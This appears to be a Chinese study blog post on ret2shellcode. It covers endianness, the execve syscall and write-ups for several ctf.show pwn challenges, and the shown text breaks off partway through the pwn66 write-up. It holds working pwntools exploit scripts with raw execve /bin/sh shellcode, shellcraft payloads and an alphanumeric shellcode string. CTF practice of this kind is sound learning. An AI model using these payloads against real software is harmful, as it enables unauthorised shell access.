        <content type="html"><![CDATA[<p>开始正式学习shellcode了！</p><h1 id="ret2shellcod"><a href="#ret2shellcod" class="headerlink" title="ret2shellcod"></a>ret2shellcod</h1><h2 id="前置基础"><a href="#前置基础" class="headerlink" title="前置基础"></a>前置基础</h2><p>大端序与小端序：</p><p>大端序和小端序是指计算机存储多字节数据类型（如整数、浮点数等）时字节的排列顺序。</p><ul><li><p>大端序：一个多字节值的最高位字节（即“大端”）存储在最低的内存地址处，其余字节按照大小递减的顺序存储。这种排列方式类似于我们写数字时从最高位到最低位的顺序。</p><p>例如一个16位的二进制数0x1234在大端序存储系统中，它的存储方式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">内存地址  数据</span><br><span class="line">0x00       0x12</span><br><span class="line">0x01       0x34</span><br></pre></td></tr></table></figure></li><li><p>小端序：一个多字节值的最低位字节（即“小端”）存储在最低的内存地址处，其余字节按照大小递增的顺序存储。这种排列方式类似于我们从最低位到最高位读取数字的顺序。</p><p>使用上面相同的16位二进制数0x1234，在小端序存储系统中，它的存储方式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">内存地址  数据</span><br><span class="line">0x00       0x34</span><br><span class="line">0x01       0x12</span><br></pre></td></tr></table></figure></li></ul><p>大多数现代个人电脑和服务器使用小端序存储，而某些大型机、网络协议和旧的计算机系统则使用大端序。</p><h2 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h2><p>32位程序执行系统调用获取shell</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">start</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v1[<span class="number">10</span>]; <span class="comment">// [esp-Ch] [ebp-Ch] BYREF</span></span><br><span class="line">  __int16 v2; <span class="comment">// [esp-2h] [ebp-2h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(v1, <span class="string">&quot;/bin///sh&quot;</span>);</span><br><span class="line">  v0 = sys_execve(v1, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>sys_execve</code> 是一个在二进制漏洞利用中常见的ROPgadget，它用于执行系统调用   execve  。  execve   是一个在Unix-like操作系统中用于执行一个新程序的系统调用，其原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">execve</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">char</span> *<span class="type">const</span> argv[], <span class="type">char</span> *<span class="type">const</span> envp[])</span>;</span><br></pre></td></tr></table></figure><p>参数说明：</p><p>•   filename  ：要执行的程序的路径。</p><p>•   argv  ：传递给新程序的参数列表。</p><p>•   envp  ：传递给新程序的环境变量列表。</p><p>在示例程序中，  sys_execve(v1, 0, 0);   表示调用   execve   系统调用，其中：</p><p>•   v1   指向要执行的程序路径·<code>/bin/sh</code>。</p><p>• 第二个参数   0   表示没有传递任何参数给新程序。</p><p>• 第三个参数   0   表示没有传递任何环境变量给新程序。</p><blockquote><p> &#x2F;bin&#x2F;sh   是一个程序路径，它指向大多数Unix-like系统中的shell程序。这里：</p><p>•   &#x2F;bin   是一个存放常用命令的目录。</p><p>•   sh   是shell程序的文件名。</p></blockquote><p>汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">push    0x68 ; &#x27;h&#x27;</span><br><span class="line">push    0x732F2F2F `s///`</span><br><span class="line">push    0x6E69622F &#x27;nib/&#x27; #因为是小端序所以倒序存放</span><br><span class="line">mov     ebx, esp        ; file</span><br><span class="line">xor     ecx, ecx        ; argv</span><br><span class="line">xor     edx, edx        ; envp</span><br><span class="line">push    0Bh</span><br><span class="line">pop     eax</span><br><span class="line">int     80h             ; LINUX - sys_execve</span><br></pre></td></tr></table></figure><h2 id="系统调用号"><a href="#系统调用号" class="headerlink" title="系统调用号"></a>系统调用号</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">read --&gt; 0</span><br><span class="line">write --&gt; 1</span><br><span class="line">opean --&gt; 5</span><br><span class="line">execve --&gt; 59</span><br><span class="line">sys_rt_sigreturn --&gt;15 </span><br></pre></td></tr></table></figure><h2 id="机器码"><a href="#机器码" class="headerlink" title="机器码"></a>机器码</h2><p>amd64小端序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">syscall  --&gt;  &#x27;\x0f&#x27;&#x27;\x05&#x27;</span><br><span class="line">nop  --&gt;  &#x27;\x90&#x27;</span><br></pre></td></tr></table></figure><h2 id="实操："><a href="#实操：" class="headerlink" title="实操："></a>实操：</h2><h3 id="shellcode编写"><a href="#shellcode编写" class="headerlink" title="shellcode编写"></a>shellcode编写</h3><h4 id="pwn62"><a href="#pwn62" class="headerlink" title="pwn62"></a>pwn62</h4><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;Linux&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28179</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">buf = io.recvuntil(<span class="string">&#x27;]&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">buf = <span class="built_in">int</span>(buf,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05&quot;</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(buf+<span class="number">32</span>)+shellcode</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分析</p><p>64位程序，开了PIE程序会给出buf的地址，栈上可读可写可执行。</p><p>首先接收buf的地址，read函数规定了输入长度0x38，分配给buf 0x10故存在栈溢出</p><p>shellcode的最大长度&#x3D;0x38-(0x10+8)-8&#x3D;24bytes故不能用pwntools生成的shellcode（还没学会怎么写）</p><p>收集到的24bytes的shellcode:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&quot;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05&quot;</span></span><br></pre></td></tr></table></figure><p>payload目前的理解(还不是很理解)：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(buf+<span class="number">32</span>)+shellcode</span><br></pre></td></tr></table></figure><p>b’a’*(0x10+8)垃圾数据填充到返回地址，因为开了PIE所以地址不确定只能用泄露出的buf地址，buf的后24字节上为leave，leave的作用相当于mov sp,bp; pop bp,会释放栈空间因此不能使用buf后的24字节，v5+24后的8个字节需要存放返回地址故shellcode只能放在buf+32后的位置上</p><p><img src="/../images/ret2shellcode/ll.png" alt="1"></p><h4 id="pwn64-mmap"><a href="#pwn64-mmap" class="headerlink" title="pwn64 mmap"></a>pwn64 mmap</h4><p>开了某种保护不代表这条路一定走不通，该题开了nx保护但是main函数中有一个mmap函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line"></span><br><span class="line">  buf = mmap(<span class="number">0</span>, <span class="number">1024u</span>, <span class="number">7</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">0</span>);<span class="comment">//</span></span><br><span class="line">  alarm(<span class="number">0xA</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Some different!&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, <span class="number">1024u</span>) &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Illegal entry!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  (buf)();<span class="comment">//调用指针buf指向的函数</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <code>buf = mmap(0, 1024u, 7, 34, 0, 0);</code>  ：调用   mmap   函数来映射 1024 字节的内存。  7   表示映射区域是可读、可写、可执行的（  PROT_READ | PROT_WRITE | PROT_EXEC  ），  34   可能是   MAP_PRIVATE | MAP_ANONYMOUS   的组合，表示创建一个私有的匿名映射。  0   和   0   分别表示文件描述符和映射的文件偏移量。</p><p>故buf指针所指向的内存区域是可执行的我们只需写入shellcode即可，因为最后<code>(buf)();</code>会调用buf指向的函数</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;Linux&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28241</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = shellcode</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="pwn65-可见字符shell"><a href="#pwn65-可见字符shell" class="headerlink" title="pwn65 可见字符shell"></a>pwn65 可见字符shell</h4><p>这题需了解汇编cmp</p><blockquote><p> cmp   是汇编语言中的一条指令，用于比较两个操作数的值。它通过执行减法操作（但不保存结果）来设置处理器的状态标志（如零标志ZF、符号标志SF、溢出标志OF等），从而为后续的条件跳转指令（如   jle(&lt;&#x3D;) 、  je&#x2F;jz(&#x3D;)、jne&#x2F;jnz(!&#x3D;)、jg(&gt;）、jl(&lt;) 、等）提供判断依据。</p><p>eg：<code>cmp operand1, operand2</code></p><p> operand1   和   operand2  ：可以是寄存器、内存地址或立即数。cmp   指令会计算   operand1 - operand2   的结果，并根据结果设置状态标志，但不会保存计算结果，只影响标志位</p></blockquote><p>“你是一个好人”</p><p>check发现NX和canary都没开64位程序，开启PIE与完全开启RELRO 有RWX: Has RWX segments判断为自己写入shell到栈上执行</p><p>IDA打开无法反编译选择看汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000001155                               buf= byte ptr -410h</span><br><span class="line">.text:0000000000001155                               var_8= dword ptr -8</span><br><span class="line">.text:0000000000001155                               var_4= dword ptr -4</span><br><span class="line">.text:0000000000001155</span><br><span class="line">.text:0000000000001155                               ; __unwind &#123;</span><br><span class="line">.text:0000000000001155 55                            push    rbp</span><br><span class="line">.text:0000000000001156 48 89 E5                      mov     rbp, rsp</span><br><span class="line">.text:0000000000001159 48 81 EC 10 04 00 00          sub     rsp, 410h</span><br><span class="line">.text:0000000000001160 BA 14 00 00 00                mov     edx, 14h                        ; n</span><br><span class="line">.text:0000000000001165 48 8D 35 98 0E 00 00          lea     rsi, aInputYouShellc            ; &quot;Input you Shellcode\n&quot;</span><br><span class="line">.text:000000000000116C BF 01 00 00 00                mov     edi, 1                          ; fd</span><br><span class="line">.text:0000000000001171 B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:0000000000001176 E8 B5 FE FF FF                call    _write</span><br><span class="line">.text:0000000000001176</span><br><span class="line">.text:000000000000117B 48 8D 85 F0 FB FF FF          lea     rax, [rbp+buf]</span><br><span class="line">.text:0000000000001182 BA 00 04 00 00                mov     edx, 400h                       ; nbytes</span><br><span class="line">.text:0000000000001187 48 89 C6                      mov     rsi, rax                        ; buf</span><br><span class="line">.text:000000000000118A BF 00 00 00 00                mov     edi, 0                          ; fd</span><br><span class="line">.text:000000000000118F B8 00 00 00 00                mov     eax, 0    </span><br><span class="line"> //eax清零用于存储read函数的返回值若读取了数据则eax为所读入的字节数未读入则为0</span><br><span class="line">.text:0000000000001194 E8 B7 FE FF FF                call    _read    </span><br><span class="line">.text:0000000000001194</span><br><span class="line">.text:0000000000001199 89 45 F8                      mov     [rbp+var_8], eax</span><br><span class="line">.text:000000000000119C 83 7D F8 00                   cmp     [rbp+var_8], 0</span><br><span class="line">//第一个比较，如果读取字节数大于零则跳转到loc_11AC</span><br><span class="line">.text:00000000000011A0 7F 0A                         jg      short loc_11AC</span><br><span class="line">.text:00000000000011A0</span><br><span class="line">.text:00000000000011A2 B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:00000000000011A7 E9 A8 00 00 00                jmp     locret_1254</span><br><span class="line">//跳转到locret_1254结束函数</span><br><span class="line">.......</span><br><span class="line">.text:0000000000001254                               locret_1254:                            ; CODE XREF: main+52↑j</span><br><span class="line">.text:0000000000001254                                                                       ; main+DF↑j</span><br><span class="line">.text:0000000000001254 C9                            leave</span><br><span class="line">.text:0000000000001255 C3                            retn</span><br><span class="line">.text:0000000000001255                               ; &#125; // starts at 1155</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000011AC                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000000011AC</span><br><span class="line">.text:00000000000011AC                               loc_11AC:                               ; CODE XREF: main+4B↑j</span><br><span class="line">.text:00000000000011AC C7 45 FC 00 00 00 00          mov     [rbp+var_4], 0</span><br><span class="line">.text:00000000000011B3 E9 82 00 00 00                jmp     loc_123A</span><br><span class="line">.text:00000000000011B3</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000011B8                               loc_11B8:                               ; CODE XREF: main+EB↓j</span><br><span class="line">.text:00000000000011B8 8B 45 FC                      mov     eax, [rbp+var_4]</span><br><span class="line">.text:00000000000011BB 48 98                         cdqe</span><br><span class="line">.text:00000000000011BD 0F B6 84 05 F0 FB FF FF       movzx   eax, [rbp+rax+buf]</span><br><span class="line">.text:00000000000011C5 3C 60                         cmp     al, 60h ; &#x27;`&#x27;</span><br><span class="line">.text:00000000000011C7 7E 11                         jle     short loc_11DA</span><br><span class="line">//&lt;=60h则跳转到loc_11DA</span><br><span class="line">.text:00000000000011C7</span><br><span class="line">.text:00000000000011C9 8B 45 FC                      mov     eax, [rbp+var_4]</span><br><span class="line">.text:00000000000011CC 48 98                         cdqe</span><br><span class="line">.text:00000000000011CE 0F B6 84 05 F0 FB FF FF       movzx   eax, [rbp+rax+buf]</span><br><span class="line">.text:00000000000011D6 3C 7A                         cmp     al, 7Ah ; &#x27;z&#x27;</span><br><span class="line">.text:00000000000011D8 7E 5C                         jle     short loc_1236</span><br><span class="line">//&lt;=74h则跳转到loc_1236</span><br><span class="line">.text:00000000000011D8</span><br><span class="line">.text:00000000000011DA</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000011DA                               loc_11DA:                               ; CODE XREF: main+72↑j</span><br><span class="line">.text:00000000000011DA 8B 45 FC                      mov     eax, [rbp+var_4]</span><br><span class="line">.text:00000000000011DD 48 98                         cdqe</span><br><span class="line">.text:00000000000011DF 0F B6 84 05 F0 FB FF FF       movzx   eax, [rbp+rax+buf]</span><br><span class="line">.text:00000000000011E7 3C 40                         cmp     al, 40h ; &#x27;@&#x27;</span><br><span class="line">.text:00000000000011E9 7E 11                         jle     short loc_11FC</span><br><span class="line">//&lt;=40h则跳转到 loc11_FC</span><br><span class="line">.text:00000000000011E9</span><br><span class="line">.text:00000000000011EB 8B 45 FC                      mov     eax, [rbp+var_4]</span><br><span class="line">.text:00000000000011EE 48 98                         cdqe</span><br><span class="line">.text:00000000000011F0 0F B6 84 05 F0 FB FF FF       movzx   eax, [rbp+rax+buf]</span><br><span class="line">.text:00000000000011F8 3C 5A                         cmp     al, 5Ah ; &#x27;Z&#x27;</span><br><span class="line">.text:00000000000011FA 7E 3A                         jle     short loc_1236</span><br><span class="line">//&lt;=5A则跳转 loc_1236</span><br><span class="line">.text:00000000000011FA</span><br><span class="line">.text:00000000000011FC</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000011FC                               loc_11FC:                               ; CODE XREF: main+94↑j</span><br><span class="line">.text:00000000000011FC 8B 45 FC                      mov     eax, [rbp+var_4]</span><br><span class="line">.text:00000000000011FF 48 98                         cdqe</span><br><span class="line">//将32位寄存器eax的值扩展到64位寄存器rax，同时保持符号位不变。这一步是为了确保后续的地址计算可以正确处理64位地址。</span><br><span class="line">.text:0000000000001201 0F B6 84 05 F0 FB FF FF       movzx   eax, [rbp+rax+buf]</span><br><span class="line">.text:0000000000001209 3C 2F                         cmp     al, 2Fh ; &#x27;/&#x27;</span><br><span class="line">.text:000000000000120B 7E 11                         jle     short loc_121E</span><br><span class="line">//&lt;=2F则跳转loc_121E</span><br><span class="line">.text:000000000000120B</span><br><span class="line">.text:000000000000120D 8B 45 FC                      mov     eax, [rbp+var_4]</span><br><span class="line">.text:0000000000001210 48 98                         cdqe</span><br><span class="line">.text:0000000000001212 0F B6 84 05 F0 FB FF FF       movzx   eax, [rbp+rax+buf]</span><br><span class="line">.text:000000000000121A 3C 5A                         cmp     al, 5Ah ; &#x27;Z&#x27;</span><br><span class="line">.text:000000000000121C 7E 18                         jle     short loc_1236</span><br><span class="line">//&lt;=5A则跳转 loc_1236</span><br><span class="line">.text:000000000000121C</span><br><span class="line">.text:000000000000121E</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000000121E                               loc_121E:                               ; CODE XREF: main+B6↑j</span><br><span class="line">.text:000000000000121E 48 8D 3D F4 0D 00 00          lea     rdi, format                     ; &quot;Good,but not right&quot;</span><br><span class="line">.text:0000000000001225 B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:000000000000122A E8 11 FE FF FF                call    _printf</span><br><span class="line">.text:000000000000122A</span><br><span class="line">.text:000000000000122F B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:0000000000001234 EB 1E                         jmp     short locret_1254</span><br><span class="line">.text:0000000000001234</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000001236                               loc_1236:                               ; CODE XREF: main+83↑j</span><br><span class="line">.text:0000000000001236                                                                       ; main+A5↑j</span><br><span class="line">.text:0000000000001236                                                                       ; main+C7↑j</span><br><span class="line">.text:0000000000001236 83 45 FC 01                   add     [rbp+var_4], 1</span><br><span class="line">//循环计时器加一，用于遍历整个buf</span><br><span class="line">.text:0000000000001236</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000000123A                               loc_123A:                               ; CODE XREF: main+5E↑j</span><br><span class="line">.text:000000000000123A 8B 45 FC                      mov     eax, [rbp+var_4]</span><br><span class="line">.text:000000000000123D 3B 45 F8                      cmp     eax, [rbp+var_8]</span><br><span class="line">.text:0000000000001240 0F 8C 72 FF FF FF             jl      loc_11B8</span><br><span class="line">// [rbp+var_4]&lt;[rbp+var_8]则跳转到loc_11B8</span><br><span class="line">.text:0000000000001240</span><br><span class="line">.text:0000000000001246 48 8D 85 F0 FB FF FF          lea     rax, [rbp+buf]</span><br><span class="line">.text:000000000000124D FF D0                         call    rax</span><br><span class="line">//执行buf上的代码</span><br><span class="line">.text:000000000000124D</span><br><span class="line">.text:000000000000124F B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:000000000000124F</span><br><span class="line">.text:0000000000001254</span><br></pre></td></tr></table></figure><p>buf中允许写入的字符范围为以下 ASCII 字符：</p><ol><li><strong>数字 <code>0-9</code></strong><br><strong>十六进制范围</strong>: <code>0x30</code> (字符 <code>0</code>) 至 <code>0x39</code> (字符 <code>9</code>)。</li><li><strong>符号 <code>: ; &lt; = &gt; ? @</code></strong><br><strong>十六进制范围</strong>: <code>0x3A</code> (字符 <code>:</code>) 至 <code>0x40</code> (字符 <code>@</code>)。</li><li><strong>大写字母 <code>A-Z</code></strong><br><strong>十六进制范围</strong>: <code>0x41</code> (字符 <code>A</code>) 至 <code>0x5A</code> (字符 <code>Z</code>)。</li><li><strong>小写字母 <code>a-z</code></strong><br><strong>十六进制范围</strong>: <code>0x61</code> (字符 <code>a</code>) 至 <code>0x7A</code> (字符 <code>z</code>)。</li></ol><p>即可见字符string.printable,所以我我们需要可见字符shellcode，可使用alpha3生成。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/TaQini/alpha3.git</span><br></pre></td></tr></table></figure><p>使用alpha3生成string.printable</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> alpha3</span><br><span class="line">python ./ALPHA3.py x64 ascii mixxedcase rax --input=<span class="string">&quot;shellcode&quot;</span> &gt; 输出文件</span><br></pre></td></tr></table></figure><p>完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;Linux&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28187</span>)</span><br><span class="line">shellcode = <span class="string">&quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;</span></span><br><span class="line">io.send (shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="pwn66-“-x00”绕检查"><a href="#pwn66-“-x00”绕检查" class="headerlink" title="pwn66 “\x00”绕检查"></a>pwn66 “\x00”绕检查</h4><p>题目：简单的shellcode？不对劲，十分得有十二分的不对劲</p><p>检查：开了nx没开canary</p><p>main函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  logo();</span><br><span class="line">  buf = mmap(<span class="number">0LL</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span 